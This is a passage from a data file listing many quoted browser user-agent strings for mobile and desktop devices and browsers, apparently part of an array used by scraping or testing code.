"Mozilla/5.0 (X11; CrOS x86_64 10122.139.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3265.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G900H) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)",
"Mozilla/5.0 (Linux; Android 5.0.2; Lenovo K920 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.93 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB7.5; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Linux; Android 9; SM-J720F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; LG-V500 Build/KOT49I.V50020f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36 OPR/44.0.2510.1159",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.90",
"Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.2.2; SM-T111 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; IF9007 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A405FM Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.103 YaBrowser/18.7.1.595.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 YaBrowser/19.4.5.141.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-G530T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; Lenovo A2010-a Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI LUA-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A305FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 OPR/53.1.2569.142848",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Lenovo A6020a46) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; LLD-AL10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G928T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (iPod touch; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 4.2.2; GSmart Roma R2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.1; LG-H324) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; GT-I9301I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J500FN Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 OPR/53.1.2569.142848",
"Mozilla/5.0 (Linux; Android 9; vivo 1806) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; CPH1969) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Spice F301 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) GSA/54.0.204505792 Mobile/16G102 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/65.0.3325.152 Mobile/16G102 Safari/604.1",
"Mozilla/5.0 (Linux; Android 5.1.1; HUAWEI M2-A01L Build/HUAWEIM2-A01L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; S4Z Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G900FD) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-S5282 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 7.0; P00L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.64 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Ixion ML350) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-P601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 OPR/44.0.2510.857",
"Mozilla/5.0 (Linux; Android 9; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.2.338.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.2; SGP621) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; GT-P5210) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 7.0; WAS-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.115.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; X55 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Power Plus 3 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-J530FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G900F Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 OPR/53.1.2569.142848",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/12.0 YaBrowser/18.4.3.119.10 Mobile/16F203 Safari/604.1",
"Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; v89_gq2008s Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 7.0; Moto C Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.1; NX591J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; ZTE Blade A5 2019RU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; TECNO KA7O Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.2; LG-H522) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; LG-M210) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; JSN-L42) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; moto e6 play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SH-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Nokia 5.1 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SO-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.167",
"Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-G9500 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX1 Build/HUAWEIANE-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J120F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J710GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; RNE-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; LYO-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.56 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-J337P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; BND-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-J701M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; BLN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-N950N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; L270) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 YaBrowser/19.1.2.337.01 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; K016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-J730FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; RNE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; YAL-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A320FL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; KSA-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI LUA-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; E5533) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; IMPRESS CLICK) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; ZTE Blade A7 2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; LG-K430) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-A260G Build/OPR6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; moto x4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG-SM-J727A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; moto g(7) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ONEPLUS A6000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; KFMUWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/75.3.60 like Chrome/75.0.3770.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44",
"Mozilla/5.0 (Linux; Android 4.4.4; SM-G360H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.172",
"Mozilla/5.0 (Linux; Android 7.1.1; CPH1719) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.1; CPH1801) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.2991.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; SM-T560) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.66 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; INE-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/85.0.130 Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; ASUS_Z00AD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; MYA-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/85.0.130 Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; Ilium X110 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:52.9) Gecko/20100101 Goanna/3.4 Firefox/52.9 ArcticFox/27.9.19",
"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44",
"Mozilla/5.0 (Linux; Android 9; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; moto g(8) plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; RMX1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; GM 8 d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3067.82",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Avast/77.2.2167.120",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 AVG/79.0.3064.81",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3067.82",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 AVG/79.0.3064.81",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3066.82",
"Mozilla/5.0 (Linux; Android 9; Moto Z3 Play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; BQ-5512L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; BV5800Pro_RU Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; F3111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B72 Zalo iOS / 278",
"Mozilla/5.0 (Linux; Android 6.0; Hisense L675) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.132 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; TECNO KB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A705MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-T331) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; M5 Note) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; Lenovo TAB 2 A7-30GC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; Micromax E481 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.1; CPH1727) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-A300FU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; JSN-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; BND-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.3.318.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Swift 2 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; G3312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; PSP5511DUO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; FIG-LA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.92",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J510H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
